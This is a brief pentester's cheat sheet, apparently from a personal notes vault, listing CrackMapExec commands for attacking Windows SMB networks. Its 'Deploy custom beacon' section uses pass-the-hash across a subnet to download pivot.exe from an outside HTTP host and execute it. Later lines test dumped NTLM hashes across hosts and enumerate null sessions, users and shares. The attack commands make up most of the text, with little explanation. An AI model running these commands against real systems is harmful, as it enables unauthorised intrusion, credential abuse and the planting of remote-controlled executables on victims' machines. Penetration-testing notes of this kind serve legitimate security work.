# Crackmapexec

## Deploy custom beacon
crackmapexec smb 172.29.138.0/24 -u Administrator -H <hash> -x "curl -o C:\Windows\Temp\pivot.exe http://172.29.137.67:8081/pivot.exe"
crackmapexec smb 172.29.138.0/24 -u Administrator -H <hash> -x "powershell.exe Invoke-Command -ScriptBlock {C:\Windows\Temp\pivot.exe}"

## Test multipe credentials
```sh
#Pattern: (.*):(.*):(.*):(.*):::
#Replacement: crackmapexec smb 172.29.139.180 -u $1 -H $4 -x whoami
crackmapexec smb 172.29.139.180 -u <USER> -H <NTLM> -x whoami
```

## [[Guest Access (SMB)]]
Enumerate null sessions
>cme smb <ip> -u '' -p ''  

Enumerate Anonymous access
>cme smb <ip> -u 'a' -p ''

## [[SMB Signing]]
Checking for SMB signing

## [[User enum]]
>cme smb <ip> -u <user> -p '<password>' --users

## [[Shares]]
* Enumerate smb hosts  
>cme smb <ip_range>

```meta
phases: 07,08
requirements: 
results: 
category: 
oss: #linux
source: https://github.com/byt3bl33d3r/CrackMapExec
description: 
```